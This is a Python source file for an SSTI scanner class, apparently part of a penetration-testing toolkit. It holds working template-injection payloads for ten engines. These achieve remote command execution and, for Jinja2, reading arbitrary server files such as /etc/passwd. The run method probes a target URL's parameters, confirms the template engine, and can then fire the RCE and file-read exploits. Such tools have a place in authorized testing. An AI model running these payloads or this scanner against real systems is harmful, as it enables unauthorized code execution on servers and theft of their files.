import json
import urllib.parse
import urllib.request
import re
from utils.output import section, info, success, warning, error, result, table


class SSTIScanner:
    description = "Advanced SSTI scanner: Jinja2, Twig, Freemarker, Velocity, Jade/Pug, ERB, Tornado, Mako, Smarty"

    ENGINES = {
        "jinja2": {
            "test": "{{7*7}}",
            "verify": "49",
            "rce_payload": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "file_read": "{{config.__class__.__init__.__globals__['__builtins__']['open']('/etc/passwd').read()}}",
        },
        "twig": {
            "test": "{{7*7}}",
            "verify": "49",
            "rce_payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        },
        "freemarker": {
            "test": "${7*7}",
            "verify": "49",
            "rce_payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
        },
        "velocity": {
            "test": "#set($x=7*7)$x",
            "verify": "49",
            "rce_payload": "#set($e='str')$e.getClass().forName('java.lang.Runtime').getMethod('exec',$e.getClass().forName('java.lang.String')).invoke($e.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')",
        },
        "jade": {
            "test": "= 7*7",
            "verify": "49",
            "rce_payload": "= global.process.mainModule.require('child_process').execSync('id')",
        },
        "pug": {
            "test": "\\#{7*7}",
            "verify": "49",
            "rce_payload": "- var x = global.process.mainModule.require('child_process').execSync('id')",
        },
        "erb": {
            "test": "<%= 7*7 %>",
            "verify": "49",
            "rce_payload": "<%= system('id') %>",
        },
        "tornado": {
            "test": "{{7*7}}",
            "verify": "49",
            "rce_payload": "{% import os %}{{os.popen('id').read()}}",
        },
        "mako": {
            "test": "${7*7}",
            "verify": "49",
            "rce_payload": "${__import__('os').popen('id').read()}",
        },
        "smarty": {
            "test": "{$smarty.now}",
            "verify": "",
            "rce_payload": "{php}echo shell_exec('id');{/php}",
        },
    }

    POLYGLOT = "${{7*7}}{%7D${7*7}<%= 7*7 %>{{7*7}}#{7*7}"

    @staticmethod
    def run(url="", target="", params="", method="GET", data="", threads=10, timeout=15, rce=False, file_read="", **kwargs):
        section("SSTI Scanner")

        target_url = url or target or ""
        if not target_url:
            error("No target URL")
            return {"error": "no target"}

        result_data = {
            "target": target_url,
            "detected_engines": [],
            "vulnerable_params": [],
            "rce_executed": False,
            "file_read_result": None,
        }

        # Discover parameters
        test_params = []
        if params:
            test_params = [p.strip() for p in params.split(",")]
        elif "?" in target_url:
            qs = target_url.split("?", 1)[1]
            for p in qs.split("&"):
                if "=" in p:
                    test_params.append(p.split("=")[0].strip())
        if not test_params:
            test_params = ["name", "username", "search", "q", "page", "id", "template", "file"]

        section(f"Testing {len(test_params)} parameters against {len(SSTIScanner.ENGINES)} engines")

        for param in test_params:
            for engine_name, engine in SSTIScanner.ENGINES.items():
                test_value = engine["test"]
                verify = engine["verify"]

                if "?" in target_url:
                    from urllib.parse import urlencode, parse_qs, urlparse
                    parsed = urlparse(target_url)
                    qs_dict = parse_qs(parsed.query)
                    qs_dict[param] = test_value
                    new_qs = urlencode(qs_dict, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
                else:
                    sep = "&" if "?" in target_url else "?"
                    test_url = f"{target_url}{sep}{param}={urllib.parse.quote(test_value)}"

                try:
                    req = urllib.request.Request(test_url)
                    if method == "POST":
                        req.method = "POST"
                        if data:
                            req.data = data.replace(f"${param}", test_value).encode()
                    with urllib.request.urlopen(req, timeout=timeout) as resp:
                        body = resp.read().decode("utf-8", errors="replace")

                        if verify and verify in body:
                            finding = {"engine": engine_name, "param": param, "payload": test_value, "verification": verify}
                            result_data["detected_engines"].append(engine_name)
                            result_data["vulnerable_params"].append(finding)
                            warning(f"SSTI confirmed: {engine_name} via parameter '{param}'")
                            info(f"  Payload: {test_value} → Response: ...{body[max(0,body.index(verify)-20):body.index(verify)+len(verify)+20]}...")
                            break
                except:
                    continue

            if engine_name in result_data["detected_engines"]:
                break

        # Polyglot test
        if not result_data["detected_engines"]:
            section("Polyglot Test")
            info("No engine detected with per-engine payloads. Trying polyglot...")
            for param in test_params[:3]:
                from urllib.parse import urlencode, parse_qs, urlparse
                parsed = urlparse(target_url)
                qs_dict = parse_qs(parsed.query)
                qs_dict[param] = SSTIScanner.POLYGLOT
                new_qs = urlencode(qs_dict, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"

                try:
                    req = urllib.request.Request(test_url)
                    with urllib.request.urlopen(req, timeout=timeout) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                        for engine_name, engine in SSTIScanner.ENGINES.items():
                            if engine.get("verify") and engine["verify"] in body:
                                result_data["detected_engines"].append(engine_name)
                                result_data["vulnerable_params"].append({"engine": engine_name, "param": param, "payload": SSTIScanner.POLYGLOT})
                                warning(f"SSTI confirmed via polyglot: {engine_name} on '{param}'")
                                break
                except:
                    continue

        # Exploitation
        if result_data["detected_engines"] and rce:
            section("RCE Exploitation")
            eng = result_data["detected_engines"][0]
            engine_info = SSTIScanner.ENGINES.get(eng)
            if engine_info and engine_info.get("rce_payload"):
                payload = engine_info["rce_payload"]
                info(f"Attempting RCE via {eng}: {payload[:60]}...")
                for param in [f["param"] for f in result_data["vulnerable_params"]]:
                    from urllib.parse import urlencode, parse_qs, urlparse
                    parsed = urlparse(target_url)
                    qs_dict = parse_qs(parsed.query)
                    qs_dict[param] = payload
                    new_qs = urlencode(qs_dict, doseq=True)
                    rce_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
                    try:
                        req = urllib.request.Request(rce_url)
                        with urllib.request.urlopen(req, timeout=timeout) as resp:
                            body = resp.read().decode("utf-8", errors="replace")
                            if "uid=" in body or "gid=" in body or "groups=" in body:
                                result_data["rce_executed"] = True
                                success(f"RCE confirmed: {body[:200]}")
                    except:
                        pass

        if result_data["detected_engines"] and file_read:
            section("File Read Exploitation")
            eng = result_data["detected_engines"][0]
            engine_info = SSTIScanner.ENGINES.get(eng)
            if engine_info and engine_info.get("file_read"):
                from urllib.parse import urlencode, parse_qs, urlparse
                parsed = urlparse(target_url)
                qs_dict = parse_qs(parsed.query)
                qs_dict[param] = engine_info["file_read"].replace("/etc/passwd", file_read)
                new_qs = urlencode(qs_dict, doseq=True)
                read_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"
                try:
                    req = urllib.request.Request(read_url)
                    with urllib.request.urlopen(req, timeout=timeout) as resp:
                        body = resp.read().decode("utf-8", errors="replace")
                        result_data["file_read_result"] = body[:500]
                        success(f"File read: {body[:200]}")
                except:
                    warning(f"File read failed: {file_read}")

        section("SSTI Scan Complete")
        if result_data["detected_engines"]:
            warning(f"SSTI confirmed in {len(result_data['detected_engines'])} engine(s): {', '.join(result_data['detected_engines'])}")
        else:
            success("No SSTI vulnerability detected")

        return result_data
